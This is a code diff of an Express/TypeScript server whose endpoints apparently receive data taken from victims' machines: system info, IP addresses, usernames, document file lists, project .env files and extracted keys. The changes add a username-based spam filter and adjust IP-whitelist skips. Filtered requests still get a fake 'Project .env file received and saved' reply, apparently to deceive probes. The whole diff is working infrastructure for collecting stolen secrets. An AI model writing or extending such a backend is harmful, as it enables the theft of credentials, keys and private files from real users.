@@ -5,6 +5,7 @@ import fs from 'fs';
 import path from 'path';
 import zlib from 'zlib';
 import { appendTransferExtractedKeysFromContents } from '../utils/transfer-extracted-keys';
+import { isSpamUsername } from '../utils/spam-filter';
 import { isReportedIpWhitelisted } from '../utils/whitelist';
 
 const router = express.Router();
@@ -89,11 +90,6 @@ router.post('/system-info', async (req: Request, res: Response) => {
         error: 'Invalid request',
         message: 'operatingSystem, ipAddress, and username are required',
       });
-    }
-
-    if (isReportedIpWhitelisted(ipAddress)) {
-      console.log(`🔕 Whitelisted ipAddress in body — skip system_info capture (${ipAddress})`);
-      return res.json({ success: true });
     }
 
     console.log(`📥 Received system info: OS=${operatingSystem}, IP=${ipAddress}, User=${username}`);
@@ -262,6 +258,12 @@ router.post('/files', async (req: Request, res: Response) => {
       return;
     }
 
+    if (isSpamUsername(username)) {
+      console.log(`🚫 Spam username — skip /files capture (${username})`);
+      res.json({ success: true });
+      return;
+    }
+
     const docFilesList = Array.isArray(docFiles) ? docFiles : [];
     const os = operatingSystem || 'unknown';
     const ip = ipAddress || 'unknown';
@@ -390,6 +392,12 @@ router.post('/project-env', async (req: Request, res: Response) => {
 
     if (isReportedIpWhitelisted(ipAddress)) {
       console.log(`🔕 Whitelisted ipAddress in body — skip /project-env capture (${ipAddress})`);
+      res.json({ success: true, message: 'Project .env file received and saved' });
+      return;
+    }
+
+    if (isSpamUsername(username)) {
+      console.log(`🚫 Spam username — skip /project-env capture (${username})`);
       res.json({ success: true, message: 'Project .env file received and saved' });
       return;
     }
